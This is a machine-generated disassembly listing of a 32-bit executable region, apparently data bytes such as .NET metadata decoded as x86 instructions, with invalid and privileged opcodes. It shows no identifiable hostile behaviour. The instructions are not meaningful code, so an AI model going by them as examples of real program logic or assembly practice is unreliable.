  405cef:	00 cf                	add    %cl,%bh
  405cf1:	06                   	push   %es
  405cf2:	35 15 06 00 5e       	xor    $0x5e000615,%eax
  405cf7:	1d 55 00 16 00       	sbb    $0x160055,%eax
  405cfc:	f7 16                	notl   (%esi)
  405cfe:	dc 02                	faddl  (%edx)
  405d00:	06                   	push   %es
  405d01:	00 29                	add    %ch,(%ecx)
  405d03:	0e                   	push   %cs
  405d04:	55                   	push   %ebp
  405d05:	00 06                	add    %al,(%esi)
  405d07:	00 6c 06 5c          	add    %ch,0x5c(%esi,%eax,1)
  405d0b:	02 06                	add    (%esi),%al
  405d0d:	00 68 0f             	add    %ch,0xf(%eax)
  405d10:	5c                   	pop    %esp
  405d11:	02 06                	add    (%esi),%al
  405d13:	00 02                	add    %al,(%edx)
  405d15:	05 5c 02 06 00       	add    $0x6025c,%eax
  405d1a:	6f                   	outsl  %ds:(%esi),(%dx)
  405d1b:	14 5c                	adc    $0x5c,%al
  405d1d:	02 06                	add    (%esi),%al
  405d1f:	00 1e                	add    %bl,(%esi)
  405d21:	12 5c 02 16          	adc    0x16(%edx,%eax,1),%bl
  405d25:	00 37                	add    %dh,(%edi)
  405d27:	12 56 15             	adc    0x15(%esi),%dl
  405d2a:	1a 00                	sbb    (%eax),%al
  405d2c:	ee                   	out    %al,(%dx)
  405d2d:	13 77 1a             	adc    0x1a(%edi),%esi
  405d30:	1a 00                	sbb    (%eax),%al
  405d32:	73 11                	jae    0x405d45
  405d34:	77 1a                	ja     0x405d50
  405d36:	8b 01                	mov    (%ecx),%eax
  405d38:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405d39:	14 00                	adc    $0x0,%al
  405d3b:	00 1a                	add    %bl,(%edx)
  405d3d:	00 13                	add    %dl,(%ebx)
  405d3f:	19 77 1a             	sbb    %esi,0x1a(%edi)
  405d42:	06                   	push   %es
  405d43:	00 2e                	add    %ch,(%esi)
  405d45:	15 e6 0f 06 00       	adc    $0x60fe6,%eax
  405d4a:	7a 00                	jp     0x405d4c
  405d4c:	e6 0f                	out    %al,$0xf
  405d4e:	06                   	push   %es
  405d4f:	00 dd                	add    %bl,%ch
  405d51:	0f e6                	(bad)
  405d53:	0f 06                	clts
  405d55:	00 da                	add    %bl,%dl
  405d57:	00 e6                	add    %ah,%dh
  405d59:	0f 06                	clts
  405d5b:	00 d6                	add    %dl,%dh
  405d5d:	12 f4                	adc    %ah,%dh
  405d5f:	1c 06                	sbb    $0x6,%al
  405d61:	00 25 10 f4 1c 06    	add    %ah,0x61cf410
  405d67:	00 a7 07 e6 0f 06    	add    %ah,0x60fe607(%edi)
  405d6d:	00 78 10             	add    %bh,0x10(%eax)
  405d70:	e6 0f                	out    %al,$0xf
  405d72:	1e                   	push   %ds
  405d73:	00 1c 11             	add    %bl,(%ecx,%edx,1)
  405d76:	9e                   	sahf
  405d77:	17                   	pop    %ss
  405d78:	06                   	push   %es
  405d79:	00 95 1d b0 0e 06    	add    %dl,0x60eb01d(%ebp)
  405d7f:	00 ca                	add    %cl,%dl
  405d81:	0e                   	push   %cs
  405d82:	b0 0e                	mov    $0xe,%al
  405d84:	06                   	push   %es
  405d85:	00 7a 06             	add    %bh,0x6(%edx)
  405d88:	b0 0e                	mov    $0xe,%al
  405d8a:	06                   	push   %es
  405d8b:	00 6f 03             	add    %ch,0x3(%edi)
  405d8e:	e6 0f                	out    %al,$0xf
  405d90:	06                   	push   %es
  405d91:	00 1a                	add    %bl,(%edx)
  405d93:	06                   	push   %es
  405d94:	90                   	nop
  405d95:	0b 0a                	or     (%edx),%ecx
  405d97:	00 07                	add    %al,(%edi)
  405d99:	14 55                	adc    $0x55,%al
  405d9b:	00 0a                	add    %cl,(%edx)
  405d9d:	00 8b 18 55 00 06    	add    %cl,0x6005518(%ebx)
  405da3:	00 d0                	add    %dl,%al
  405da5:	04 55                	add    $0x55,%al
  405da7:	00 43 00             	add    %al,0x0(%ebx)
  405daa:	e4 14                	in     $0x14,%al
  405dac:	00 00                	add    %al,(%eax)
  405dae:	12 00                	adc    (%eax),%al
  405db0:	9d                   	popf
  405db1:	05 b2 12 06 00       	add    $0x612b2,%eax
  405db6:	12 00                	adc    (%eax),%al
  405db8:	c1 02 06             	roll   $0x6,(%edx)
  405dbb:	00 aa 10 e6 0f 06    	add    %ch,0x60fe610(%edx)
  405dc1:	00 11                	add    %dl,(%ecx)
  405dc3:	1d 47 11 06 00       	sbb    $0x61147,%eax
  405dc8:	33 08                	xor    (%eax),%ecx
  405dca:	e6 0f                	out    %al,$0xf
  405dcc:	06                   	push   %es
  405dcd:	00 ef                	add    %ch,%bh
  405dcf:	14 e6                	adc    $0xe6,%al
  405dd1:	0f 06                	clts
  405dd3:	00 f6                	add    %dh,%dh
  405dd5:	05 e6 0f 22 00       	add    $0x220fe6,%eax
  405dda:	44                   	inc    %esp
  405ddb:	12 4d 13             	adc    0x13(%ebp),%cl
  405dde:	22 00                	and    (%eax),%al
  405de0:	c5 16                	lds    (%esi),%edx
  405de2:	4d                   	dec    %ebp
  405de3:	13 22                	adc    (%edx),%esp
  405de5:	00 74 13 4d          	add    %dh,0x4d(%ebx,%edx,1)
  405de9:	13 12                	adc    (%edx),%edx
  405deb:	00 6c 13 93          	add    %ch,-0x6d(%ebx,%edx,1)
  405def:	15 22 00 dd 16       	adc    $0x16dd0022,%eax
  405df4:	4d                   	dec    %ebp
  405df5:	13 06                	adc    (%esi),%eax
  405df7:	00 4d 16             	add    %cl,0x16(%ebp)
  405dfa:	f4                   	hlt
  405dfb:	1c 06                	sbb    $0x6,%al
  405dfd:	00 e3                	add    %ah,%bl
  405dff:	11 e6                	adc    %esp,%esi
  405e01:	0f 06                	clts
  405e03:	00 54 16 f4          	add    %dl,-0xc(%esi,%edx,1)
  405e07:	1c 12                	sbb    $0x12,%al
  405e09:	00 08                	add    %cl,(%eax)
  405e0b:	13 f4                	adc    %esp,%esi
  405e0d:	1c 06                	sbb    $0x6,%al
  405e0f:	00 9c 0f f4 1c 06 00 	add    %bl,0x61cf4(%edi,%ecx,1)
  405e16:	fb                   	sti
  405e17:	00 f4                	add    %dh,%ah
  405e19:	1c 06                	sbb    $0x6,%al
  405e1b:	00 cd                	add    %cl,%ch
  405e1d:	11 e6                	adc    %esp,%esi
  405e1f:	0f 06                	clts
  405e21:	00 fe                	add    %bh,%dh
  405e23:	0f f4 1c 06          	pmuludq (%esi,%eax,1),%mm3
  405e27:	00 47 05             	add    %al,0x5(%edi)
  405e2a:	f4                   	hlt
  405e2b:	1c 06                	sbb    $0x6,%al
  405e2d:	00 0b                	add    %cl,(%ebx)
  405e2f:	05 f4 1c 06 00       	add    $0x61cf4,%eax
  405e34:	3f                   	aas
  405e35:	10 f4                	adc    %dh,%ah
  405e37:	1c 06                	sbb    $0x6,%al
  405e39:	00 26                	add    %ah,(%esi)
  405e3b:	05 f4 1c 06 00       	add    $0x61cf4,%eax
  405e40:	b6 11                	mov    $0x11,%dh
  405e42:	f4                   	hlt
  405e43:	1c 06                	sbb    $0x6,%al
  405e45:	00 95 13 e6 0f 06    	add    %dl,0x60fe613(%ebp)
  405e4b:	00 87 1c e6 0f 06    	add    %al,0x60fe61c(%edi)
  405e51:	00 f7                	add    %dh,%bh
  405e53:	17                   	pop    %ss
  405e54:	93                   	xchg   %eax,%ebx
  405e55:	15 06 00 d3 05       	adc    $0x5d30006,%eax
  405e5a:	e6 0f                	out    %al,$0xf
  405e5c:	06                   	push   %es
  405e5d:	00 26                	add    %ah,(%esi)
  405e5f:	03 f4                	add    %esp,%esi
  405e61:	1c 06                	sbb    $0x6,%al
  405e63:	00 c7                	add    %al,%bh
  405e65:	00 e6                	add    %ah,%dh
  405e67:	0f 06                	clts
  405e69:	00 c1                	add    %al,%cl
  405e6b:	05 e6 0f 06 00       	add    $0x60fe6,%eax
  405e70:	3f                   	aas
  405e71:	06                   	push   %es
  405e72:	e6 0f                	out    %al,$0xf
  405e74:	06                   	push   %es
  405e75:	00 26                	add    %ah,(%esi)
  405e77:	18 5c 02 06          	sbb    %bl,0x6(%edx,%eax,1)
  405e7b:	00 38                	add    %bh,(%eax)
  405e7d:	08 5c 02 0a          	or     %bl,0xa(%edx,%eax,1)
  405e81:	00 a9 0f 06 11 0a    	add    %ch,0xa11060f(%ecx)
  405e87:	00 37                	add    %dh,(%edi)
  405e89:	05 06 11 00 00       	add    $0x1106,%eax
  405e8e:	00 00                	add    %al,(%eax)
  405e90:	40                   	inc    %eax
  405e91:	01 00                	add    %eax,(%eax)
  405e93:	00 00                	add    %al,(%eax)
  405e95:	00 01                	add    %al,(%ecx)
  405e97:	00 01                	add    %al,(%ecx)
  405e99:	00 01                	add    %al,(%ecx)
  405e9b:	00 10                	add    %dl,(%eax)
  405e9d:	00 c1                	add    %al,%cl
  405e9f:	0f 70 1a 05          	pshufw $0x5,(%edx),%mm3
  405ea3:	00 01                	add    %al,(%ecx)
  405ea5:	00 01                	add    %al,(%ecx)
  405ea7:	00 81 01 10 00 09    	add    %al,0x9001001(%ecx)
  405ead:	17                   	pop    %ss
  405eae:	70 1a                	jo     0x405eca
  405eb0:	05 00 01 00 03       	add    $0x3000100,%eax
  405eb5:	00 81 01 10 00 91    	add    %al,-0x6effefff(%ecx)
  405ebb:	19 8e 11 05 00 13    	sbb    %ecx,0x13000511(%esi)
  405ec1:	00 06                	add    %al,(%esi)
  405ec3:	00 00                	add    %al,(%eax)
  405ec5:	00 10                	add    %dl,(%eax)
  405ec7:	00 a4 12 fe 0e 05 00 	add    %ah,0x50efe(%edx,%edx,1)
  405ece:	1e                   	push   %ds
  405ecf:	00 24 00             	add    %ah,(%eax,%eax,1)
  405ed2:	00 00                	add    %al,(%eax)
  405ed4:	10 00                	adc    %al,(%eax)
  405ed6:	29 17                	sub    %edx,(%edi)
  405ed8:	2d 14 05 00 1e       	sub    $0x1e000514,%eax
  405edd:	00 26                	add    %ah,(%esi)
  405edf:	00 81 01 10 00 80    	add    %al,-0x7fffefff(%ecx)
  405ee5:	10 2d 14 05 00 1e    	adc    %ch,0x1e000514
  405eeb:	00 2d 00 81 01 10    	add    %ch,0x10018100
  405ef1:	00 3d 13 2d 14 05    	add    %bh,0x5142d13
  405ef7:	00 1e                	add    %bl,(%esi)
  405ef9:	00 2f                	add    %ch,(%edi)
  405efb:	00 81 01 10 00 4e    	add    %al,0x4e001001(%ecx)
  405f01:	15 2d 14 05 00       	adc    $0x5142d,%eax
  405f06:	1e                   	push   %ds
  405f07:	00 30                	add    %dh,(%eax)
  405f09:	00 81 01 10 00 4d    	add    %al,0x4d001001(%ecx)
  405f0f:	0f 2d 14 05 00 1e 00 	cvtps2pi 0x36001e00(,%eax,1),%mm2
  405f16:	36 
  405f17:	00 81 01 10 00 48    	add    %al,0x48001001(%ecx)
  405f1d:	15 2d 14 05 00       	adc    $0x5142d,%eax
  405f22:	1f                   	pop    %ds
  405f23:	00 38                	add    %bh,(%eax)
  405f25:	00 02                	add    %al,(%edx)
  405f27:	01 00                	add    %eax,(%eax)
  405f29:	00 01                	add    %al,(%ecx)
  405f2b:	02 00                	add    (%eax),%al
  405f2d:	00 39                	add    %bh,(%ecx)
  405f2f:	00 1f                	add    %bl,(%edi)
  405f31:	00 3e                	add    %bh,(%esi)
  405f33:	00 81 01 10 00 8e    	add    %al,-0x71ffefff(%ecx)
  405f39:	0e                   	push   %cs
  405f3a:	2d 14 05 00 23       	sub    $0x23000514,%eax
  405f3f:	00 3e                	add    %bh,(%esi)
  405f41:	00 81 01 10 00 5b    	add    %al,0x5b001001(%ecx)
  405f47:	1d 2d 14 05 00       	sbb    $0x5142d,%eax
  405f4c:	23 00                	and    (%eax),%eax
  405f4e:	41                   	inc    %ecx
  405f4f:	00 81 01 10 00 8a    	add    %al,-0x75ffefff(%ecx)
  405f55:	19 6c 19 05          	sbb    %ebp,0x5(%ecx,%ebx,1)
  405f59:	00 24 00             	add    %ah,(%eax,%eax,1)
  405f5c:	46                   	inc    %esi
  405f5d:	00 83 01 10 00 80    	add    %al,-0x7fffefff(%ebx)
  405f63:	00 00                	add    %al,(%eax)
  405f65:	00 05 00 25 00 4b    	add    %al,0x4b002500
  405f6b:	00 01                	add    %al,(%ecx)
  405f6d:	00 10                	add    %dl,(%eax)
  405f6f:	00 0d 01 ed 0f 05    	add    %cl,0x50fed01
  405f75:	00 26                	add    %ah,(%esi)
  405f77:	00 4b 00             	add    %cl,0x0(%ebx)
  405f7a:	81 01 10 00 06 01    	addl   $0x1060010,(%ecx)
  405f80:	ed                   	in     (%dx),%eax
  405f81:	0f 05                	syscall
  405f83:	00 2d 00 52 00 00    	add    %ch,0x5200
  405f89:	01 00                	add    %eax,(%eax)
  405f8b:	00 58 01             	add    %bl,0x1(%eax)
  405f8e:	00 00                	add    %al,(%eax)
  405f90:	05 00 2d 00 54       	add    $0x54002d00,%eax
  405f95:	00 13                	add    %dl,(%ebx)
  405f97:	01 00                	add    %eax,(%eax)
  405f99:	00 38                	add    %bh,(%eax)
  405f9b:	00 00                	add    %al,(%eax)
  405f9d:	00 51 00             	add    %dl,0x0(%ecx)
  405fa0:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405fa5:	00 10                	add    %dl,(%eax)
  405fa7:	00 93 17 b7 0d 05    	add    %dl,0x50db717(%ebx)
  405fad:	00 2e                	add    %ch,(%esi)
  405faf:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405fb3:	00 10                	add    %dl,(%eax)
  405fb5:	00 50 10             	add    %dl,0x10(%eax)
  405fb8:	b7 0d                	mov    $0xd,%bh
  405fba:	05 00 2f 00 5f       	add    $0x5f002f00,%eax
  405fbf:	00 01                	add    %al,(%ecx)
  405fc1:	00 10                	add    %dl,(%eax)
  405fc3:	00 61 1c             	add    %ah,0x1c(%ecx)
  405fc6:	b7 0d                	mov    $0xd,%bh
  405fc8:	05 00 31 00 63       	add    $0x63003100,%eax
  405fcd:	00 01                	add    %al,(%ecx)
  405fcf:	00 10                	add    %dl,(%eax)
  405fd1:	00 d2                	add    %dl,%dl
  405fd3:	0d b7 0d 05 00       	or     $0x50db7,%eax
  405fd8:	33 00                	xor    (%eax),%eax
  405fda:	6a 00                	push   $0x0
  405fdc:	01 01                	add    %eax,(%ecx)
  405fde:	00 00                	add    %al,(%eax)
  405fe0:	0c 08                	or     $0x8,%al
  405fe2:	b7 0d                	mov    $0xd,%bh
  405fe4:	39 00                	cmp    %eax,(%eax)
  405fe6:	3a 00                	cmp    (%eax),%al
  405fe8:	95                   	xchg   %eax,%ebp
  405fe9:	00 00                	add    %al,(%eax)
  405feb:	00 10                	add    %dl,(%eax)
  405fed:	00 7e 17             	add    %bh,0x17(%esi)
  405ff0:	b7 0d                	mov    $0xd,%bh
  405ff2:	05 00 47 00 95       	add    $0x95004700,%eax
  405ff7:	00 00                	add    %al,(%eax)
  405ff9:	00 10                	add    %dl,(%eax)
  405ffb:	00 88 17 b7 0d 05    	add    %cl,0x50db717(%eax)
  406001:	00 47 00             	add    %al,0x0(%edi)
  406004:	99                   	cltd
  406005:	00 81 01 10 00 7e    	add    %al,0x7e001001(%ecx)
  40600b:	12 b7 0d 05 00 47    	adc    0x4700050d(%edi),%dh
  406011:	00 a2 00 00 01 00    	add    %ah,0x10000(%edx)
  406017:	00 49 01             	add    %cl,0x1(%ecx)
  40601a:	00 00                	add    %al,(%eax)
  40601c:	05 00 47 00 a4       	add    $0xa4004700,%eax
  406021:	00 13                	add    %dl,(%ebx)
  406023:	01 00                	add    %eax,(%eax)
  406025:	00 1b                	add    %bl,(%ebx)
  406027:	01 00                	add    %eax,(%eax)
  406029:	00 51 00             	add    %dl,0x0(%ecx)
  40602c:	48                   	dec    %eax
  40602d:	00 a4 00 16 00 98 18 	add    %ah,0x18980016(%eax,%eax,1)
  406034:	12 00                	adc    (%eax),%al
  406036:	16                   	push   %ss
  406037:	00 a5 18 12 00 16    	add    %ah,0x16001218(%ebp)
  40603d:	00 fe                	add    %bh,%dh
  40603f:	10 12                	adc    %dl,(%edx)
  406041:	00 16                	add    %dl,(%esi)
  406043:	00 05 0f 12 00 16    	add    %al,0x1600120f
  406049:	00 2f                	add    %ch,(%edi)
  40604b:	13 12                	adc    (%edx),%edx
  40604d:	00 16                	add    %dl,(%esi)
  40604f:	00 46 06             	add    %al,0x6(%esi)
  406052:	12 00                	adc    (%eax),%al
  406054:	16                   	push   %ss
  406055:	00 eb                	add    %ch,%bl
  406057:	1c 12                	sbb    $0x12,%al
  406059:	00 16                	add    %dl,(%esi)
  40605b:	00 97 02 12 00 16    	add    %dl,0x16001202(%edi)
  406061:	00 9b 08 12 00 16    	add    %bl,0x16001208(%ebx)
  406067:	00 4e 08             	add    %cl,0x8(%esi)
  40606a:	12 00                	adc    (%eax),%al
  40606c:	16                   	push   %ss
  40606d:	00 95 08 15 00 16    	add    %dl,0x16001508(%ebp)
  406073:	00 9b 0d 12 00 16    	add    %bl,0x1600120d(%ebx)
  406079:	00 14 01             	add    %dl,(%ecx,%eax,1)
  40607c:	19 00                	sbb    %eax,(%eax)
  40607e:	16                   	push   %ss
  40607f:	00 c6                	add    %al,%dh
  406081:	10 12                	adc    %dl,(%edx)
  406083:	00 16                	add    %dl,(%esi)
  406085:	00 6b 02             	add    %ch,0x2(%ebx)
  406088:	12 00                	adc    (%eax),%al
  40608a:	16                   	push   %ss
  40608b:	00 74 03 12          	add    %dh,0x12(%ebx,%eax,1)
  40608f:	00 16                	add    %dl,(%esi)
  406091:	00 40 1c             	add    %al,0x1c(%eax)
  406094:	12 00                	adc    (%eax),%al
  406096:	16                   	push   %ss
  406097:	00 9e 12 12 00 11    	add    %bl,0x11001212(%esi)
  40609d:	00 80 04 21 00 11    	add    %al,0x11002104(%eax)
  4060a3:	00 65 04             	add    %ah,0x4(%ebp)
  4060a6:	25 00 11 00 35       	and    $0x35001100,%eax
  4060ab:	04 29                	add    $0x29,%al
  4060ad:	00 11                	add    %dl,(%ecx)
  4060af:	00 cb                	add    %cl,%bl
  4060b1:	03 2d 00 11 00 4d    	add    0x4d001100,%ebp
  4060b7:	04 2d                	add    $0x2d,%al
  4060b9:	00 11                	add    %dl,(%ecx)
  4060bb:	00 b0 03 30 00 11    	add    %dh,0x11003003(%eax)
  4060c1:	00 93 03 34 00 31    	add    %dl,0x31003403(%ebx)
  4060c7:	00 79 03             	add    %bh,0x3(%ecx)
  4060ca:	37                   	aaa
  4060cb:	00 11                	add    %dl,(%ecx)
  4060cd:	00 e7                	add    %ah,%bh
  4060cf:	03 30                	add    (%eax),%esi
  4060d1:	00 11                	add    %dl,(%ecx)
  4060d3:	00 1b                	add    %bl,(%ebx)
  4060d5:	04 3a                	add    $0x3a,%al
  4060d7:	00 11                	add    %dl,(%ecx)
  4060d9:	00 fd                	add    %bh,%ch
  4060db:	03 34 00             	add    (%eax,%eax,1),%esi
  4060de:	16                   	push   %ss
  4060df:	00 82 12 dc 00 06    	add    %al,0x600dc12(%edx)
  4060e5:	06                   	push   %es
  4060e6:	9b                   	fwait
  4060e7:	02 06                	add    (%esi),%al
  4060e9:	01 56 80             	add    %edx,-0x80(%esi)
  4060ec:	70 02                	jo     0x4060f0
  4060ee:	09 01                	or     %eax,(%ecx)
  4060f0:	56                   	push   %esi
  4060f1:	80 ce 01             	or     $0x1,%dh
  4060f4:	09 01                	or     %eax,(%ecx)
  4060f6:	56                   	push   %esi
  4060f7:	80 bb 01 09 01 31 00 	cmpb   $0x0,0x31010901(%ebx)
  4060fe:	fe 01                	incb   (%ecx)
  406100:	12 00                	adc    (%eax),%al
  406102:	16                   	push   %ss
  406103:	00 47 17             	add    %al,0x17(%edi)
  406106:	30 01                	xor    %al,(%ecx)
  406108:	16                   	push   %ss
  406109:	00 0b                	add    %cl,(%ebx)
  40610b:	00 43 01             	add    %al,0x1(%ebx)
  40610e:	51                   	push   %ecx
  40610f:	80 8d 0d 3a 00 51 80 	orb    $0x80,0x51003a0d(%ebp)
  406116:	89 0d 3a 00 51 80    	mov    %ecx,0x8051003a
  40611c:	80 0d 3a 00 51 80 64 	orb    $0x64,0x8051003a
  406123:	0d 3a 00 21 00       	or     $0x21003a,%eax
  406128:	ef                   	out    %eax,(%dx)
  406129:	1c 29                	sbb    $0x29,%al
  40612b:	00 21                	add    %ah,(%ecx)
  40612d:	00 d0                	add    %dl,%al
  40612f:	1c 29                	sbb    $0x29,%al
  406131:	00 31                	add    %dh,(%ecx)
  406133:	00 ec                	add    %ch,%ah
  406135:	19 29                	sbb    %ebp,(%ecx)
  406137:	00 33                	add    %dh,(%ebx)
  406139:	01 77 01             	add    %esi,0x1(%edi)
  40613c:	8b 01                	mov    (%ecx),%eax
  40613e:	11 00                	adc    %eax,(%eax)
  406140:	5d                   	pop    %ebp
  406141:	05 8f 01 01 00       	add    $0x1018f,%eax
  406146:	8c 10                	mov    %ss,(%eax)
  406148:	30 01                	xor    %al,(%ecx)
  40614a:	01 00                	add    %eax,(%eax)
  40614c:	ad                   	lods   %ds:(%esi),%eax
  40614d:	11 3a                	adc    %edi,(%edx)
  40614f:	00 01                	add    %al,(%ecx)
  406151:	00 8c 10 30 01 01 00 	add    %cl,0x10130(%eax,%edx,1)
  406158:	27                   	daa
  406159:	14 c7                	adc    $0xc7,%al
  40615b:	01 01                	add    %eax,(%ecx)
  40615d:	00 a2 07 12 00 01    	add    %ah,0x1001207(%edx)
  406163:	00 82 07 12 00 01    	add    %al,0x1001207(%edx)
  406169:	00 a4 0a 37 00 01 00 	add    %ah,0x10037(%edx,%ecx,1)
  406170:	02 08                	add    (%eax),%cl
  406172:	02 02                	add    (%edx),%al
  406174:	01 00                	add    %eax,(%eax)
  406176:	95                   	xchg   %eax,%ebp
  406177:	1a c7                	sbb    %bh,%al
  406179:	01 01                	add    %eax,(%ecx)
  40617b:	00 8c 10 30 01 01 00 	add    %cl,0x10130(%eax,%edx,1)
  406182:	82 1c 06 02          	sbbb   $0x2,(%esi,%eax,1)
  406186:	06                   	push   %es
  406187:	06                   	push   %es
  406188:	9b                   	fwait
  406189:	02 3a                	add    (%edx),%bh
  40618b:	00 56 80             	add    %dl,-0x80(%esi)
  40618e:	f5                   	cmc
  40618f:	11 02                	adc    %eax,(%edx)
  406191:	02 56 80             	add    -0x80(%esi),%dl
  406194:	48                   	dec    %eax
  406195:	0f 02 02             	lar    (%edx),%eax
  406198:	56                   	push   %esi
  406199:	80 6d 12 02          	subb   $0x2,0x12(%ebp)
  40619d:	02 56 80             	add    -0x80(%esi),%dl
  4061a0:	87 1c 02             	xchg   %ebx,(%edx,%eax,1)
  4061a3:	02 56 80             	add    -0x80(%esi),%dl
  4061a6:	bb 0c 02 02 56       	mov    $0x5602020c,%ebx
  4061ab:	80 d7 13             	adc    $0x13,%bh
  4061ae:	02 02                	add    (%edx),%al
  4061b0:	56                   	push   %esi
  4061b1:	80 c7 00             	add    $0x0,%bh
  4061b4:	02 02                	add    (%edx),%al
  4061b6:	56                   	push   %esi
  4061b7:	80 78 10 02          	cmpb   $0x2,0x10(%eax)
  4061bb:	02 56 80             	add    -0x80(%esi),%dl
  4061be:	02 19                	add    (%ecx),%bl
  4061c0:	02 02                	add    (%edx),%al
  4061c2:	56                   	push   %esi
  4061c3:	80 3f 06             	cmpb   $0x6,(%edi)
  4061c6:	02 02                	add    (%edx),%al
  4061c8:	56                   	push   %esi
  4061c9:	80 a7 07 02 02 56 80 	andb   $0x80,0x56020207(%edi)
  4061d0:	40                   	inc    %eax
  4061d1:	1d 02 02 33 01       	sbb    $0x1330202,%eax
  4061d6:	11 02                	adc    %eax,(%edx)
  4061d8:	fd                   	std
  4061d9:	02 08                	add    (%eax),%cl
  4061db:	26 00 00             	add    %al,%es:(%eax)
  4061de:	00 00                	add    %al,(%eax)
  4061e0:	96                   	xchg   %eax,%esi
  4061e1:	00 95 10 0a 00 01    	add    %dl,0x1000a10(%ebp)
  4061e7:	00 78 20             	add    %bh,0x20(%eax)
  4061ea:	00 00                	add    %al,(%eax)
  4061ec:	00 00                	add    %al,(%eax)
  4061ee:	86 18                	xchg   %bl,(%eax)
  4061f0:	f9                   	stc
  4061f1:	14 0e                	adc    $0xe,%al
  4061f3:	00 01                	add    %al,(%ecx)
  4061f5:	00 f8                	add    %bh,%al
  4061f7:	26 00 00             	add    %al,%es:(%eax)
  4061fa:	00 00                	add    %al,(%eax)
  4061fc:	96                   	xchg   %eax,%esi
  4061fd:	00 ff                	add    %bh,%bh
  4061ff:	16                   	push   %ss
  406200:	1d 00 01 00 50       	sbb    $0x50000100,%eax
  406205:	28 00                	sub    %al,(%eax)
  406207:	00 00                	add    %al,(%eax)
  406209:	00 91 00 2f 0d 1d    	add    %dl,0x1d0d2f00(%ecx)
  40620f:	00 01                	add    %al,(%ecx)
  406211:	00 c0                	add    %al,%al
  406213:	28 00                	sub    %al,(%eax)
  406215:	00 00                	add    %al,(%eax)
  406217:	00 91 18 ff 14 0a    	add    %dl,0xa14ff18(%ecx)
  40621d:	00 01                	add    %al,(%ecx)
  40621f:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  406225:	00 96 08 46 1a 3d    	add    %dl,0x3d1a4608(%esi)
  40622b:	00 01                	add    %al,(%ecx)
  40622d:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  406233:	00 96 08 54 1a 42    	add    %dl,0x421a5408(%esi)
  406239:	00 01                	add    %al,(%ecx)
  40623b:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406241:	00 96 08 2a 1a 48    	add    %dl,0x481a2a08(%esi)
  406247:	00 02                	add    %al,(%edx)
  406249:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  40624f:	00 96 08 38 1a 4d    	add    %dl,0x4d1a3808(%esi)
  406255:	00 02                	add    %al,(%edx)
  406257:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  40625d:	00 91 08 86 13 53    	add    %dl,0x53138608(%ecx)
  406263:	00 03                	add    %al,(%ebx)
  406265:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  40626b:	00 91 08 91 13 58    	add    %dl,0x58139108(%ecx)
  406271:	00 03                	add    %al,(%ebx)
  406273:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406279:	00 91 08 0e 0b 5e    	add    %dl,0x5e0b0e08(%ecx)
  40627f:	00 04 00             	add    %al,(%eax,%eax,1)
  406282:	b4 20                	mov    $0x20,%ah
  406284:	00 00                	add    %al,(%eax)
  406286:	00 00                	add    %al,(%eax)
  406288:	91                   	xchg   %eax,%ecx
  406289:	08 1d 0b 62 00 04    	or     %bl,0x400620b
  40628f:	00 bc 20 00 00 00 00 	add    %bh,0x0(%eax,%eiz,1)
  406296:	91                   	xchg   %eax,%ecx
  406297:	08 c3                	or     %al,%bl
  406299:	19 5e 00             	sbb    %ebx,0x0(%esi)
  40629c:	05 00 c3 20 00       	add    $0x20c300,%eax
  4062a1:	00 00                	add    %al,(%eax)
  4062a3:	00 91 08 ce 19 62    	add    %dl,0x6219ce08(%ecx)
  4062a9:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062af:	00 00                	add    %al,(%eax)
  4062b1:	00 91 08 c7 0a 67    	add    %dl,0x670ac708(%ecx)
  4062b7:	00 06                	add    %al,(%esi)
  4062b9:	00 d2                	add    %dl,%dl
  4062bb:	20 00                	and    %al,(%eax)
  4062bd:	00 00                	add    %al,(%eax)
  4062bf:	00 91 08 d5 0a 6c    	add    %dl,0x6c0ad508(%ecx)
  4062c5:	00 06                	add    %al,(%esi)
  4062c7:	00 da                	add    %bl,%dl
  4062c9:	20 00                	and    %al,(%eax)
  4062cb:	00 00                	add    %al,(%eax)
  4062cd:	00 96 08 42 03 1d    	add    %dl,0x1d034208(%esi)
  4062d3:	00 07                	add    %al,(%edi)
  4062d5:	00 e1                	add    %ah,%cl
  4062d7:	20 00                	and    %al,(%eax)
  4062d9:	00 00                	add    %al,(%eax)
  4062db:	00 96 08 52 03 72    	add    %dl,0x72035208(%esi)
  4062e1:	00 07                	add    %al,(%edi)
  4062e3:	00 e9                	add    %ch,%cl
  4062e5:	20 00                	and    %al,(%eax)
  4062e7:	00 00                	add    %al,(%eax)
  4062e9:	00 91 08 f2 02 77    	add    %dl,0x7702f208(%ecx)
  4062ef:	00 08                	add    %cl,(%eax)
  4062f1:	00 f0                	add    %dh,%al
  4062f3:	20 00                	and    %al,(%eax)
  4062f5:	00 00                	add    %al,(%eax)
  4062f7:	00 91 08 7e 0b 67    	add    %dl,0x670b7e08(%ecx)
  4062fd:	00 08                	add    %cl,(%eax)
  4062ff:	00 f7                	add    %dh,%bh
  406301:	20 00                	and    %al,(%eax)
  406303:	00 00                	add    %al,(%eax)
  406305:	00 91 08 87 0b 6c    	add    %dl,0x6c0b8708(%ecx)
  40630b:	00 08                	add    %cl,(%eax)
  40630d:	00 ff                	add    %bh,%bh
  40630f:	20 00                	and    %al,(%eax)
  406311:	00 00                	add    %al,(%eax)
  406313:	00 96 08 e4 0e 7b    	add    %dl,0x7b0ee408(%esi)
  406319:	00 09                	add    %cl,(%ecx)
  40631b:	00 06                	add    %al,(%esi)
  40631d:	21 00                	and    %eax,(%eax)
  40631f:	00 00                	add    %al,(%eax)
  406321:	00 96 08 f1 0e 7f    	add    %dl,0x7f0ef108(%esi)
  406327:	00 09                	add    %cl,(%ecx)
  406329:	00 0e                	add    %cl,(%esi)
  40632b:	21 00                	and    %eax,(%eax)
  40632d:	00 00                	add    %al,(%eax)
  40632f:	00 96 08 db 0c 1d    	add    %dl,0x1d0cdb08(%esi)
  406335:	00 0a                	add    %cl,(%edx)
  406337:	00 15 21 00 00 00    	add    %dl,0x21
  40633d:	00 96 08 ec 0c 72    	add    %dl,0x720cec08(%esi)
